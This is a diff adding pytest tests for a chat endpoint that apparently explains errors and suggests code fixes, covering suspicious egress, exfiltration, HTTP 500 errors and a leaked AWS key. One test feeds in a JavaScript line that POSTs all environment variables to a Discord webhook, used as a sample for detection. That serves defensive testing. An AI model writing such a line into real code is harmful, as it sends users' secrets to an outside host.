@@ -133,3 +133,57 @@ async def test_09_chat_explains_econnrefused(client: AsyncClient):
     data = res.json()
     assert "ECONNREFUSED" in data["explanation"] or "Connection Refused" in data["explanation"]
     assert "retry" in data["rewritten_code"].lower() or "backoff" in data["rewritten_code"].lower()
+
+
+@pytest.mark.asyncio
+async def test_10_chat_explains_suspicious_activity_and_anomaly(client: AsyncClient):
+    payload = {
+        "message": "We detected suspicious activity and anomalous network egress in background tasks.",
+        "file_path": "src/tasks.ts",
+    }
+    res = await client.post("/api/v1/barqai/chat", json=payload)
+    assert res.status_code == 200
+    data = res.json()
+    assert "Suspicious Activity" in data["explanation"] or "Threat Intelligence" in data["explanation"]
+    assert "Zero-Trust" in data["rewritten_code"] or "assertNetworkAllowed" in data["rewritten_code"]
+
+
+@pytest.mark.asyncio
+async def test_11_chat_explains_data_exfiltration_and_c2(client: AsyncClient):
+    payload = {
+        "message": "Suspicious outbound connection to discord.com/api/webhooks with leaked tokens",
+        "code_snippet": "fetch('https://discord.com/api/webhooks/xyz', { method: 'POST', body: JSON.stringify(process.env) })",
+        "file_path": "src/leak.js",
+    }
+    res = await client.post("/api/v1/barqai/chat", json=payload)
+    assert res.status_code == 200
+    data = res.json()
+    assert "Exfiltration" in data["explanation"] or "C2" in data["explanation"]
+    assert "REDACTED" in data["rewritten_code"] or "sanitizeOutgoingPayload" in data["rewritten_code"]
+
+
+@pytest.mark.asyncio
+async def test_12_chat_explains_http_500_internal_server_error(client: AsyncClient):
+    payload = {
+        "message": "HTTP 500 Internal Server Error: UnhandledPromiseRejection in checkout controller",
+        "file_path": "src/controllers/order.ts",
+    }
+    res = await client.post("/api/v1/barqai/chat", json=payload)
+    assert res.status_code == 200
+    data = res.json()
+    assert "500" in data["explanation"]
+    assert "errorHandler" in data["rewritten_code"] or "500" in data["rewritten_code"]
+
+
+@pytest.mark.asyncio
+async def test_13_chat_explains_secret_leak(client: AsyncClient):
+    payload = {
+        "message": "Secret leak: AWS_SECRET_ACCESS_KEY exposed in client repository",
+        "code_snippet": "const awsSecret = 'AKIAIOSFODNN7EXAMPLE';",
+        "file_path": "src/config.ts",
+    }
+    res = await client.post("/api/v1/barqai/chat", json=payload)
+    assert res.status_code == 200
+    data = res.json()
+    assert "Secret" in data["explanation"] or "Token" in data["explanation"] or "CWE-798" in data["explanation"]
+    assert "getRequiredSecret" in data["rewritten_code"] or "process.env" in data["rewritten_code"]
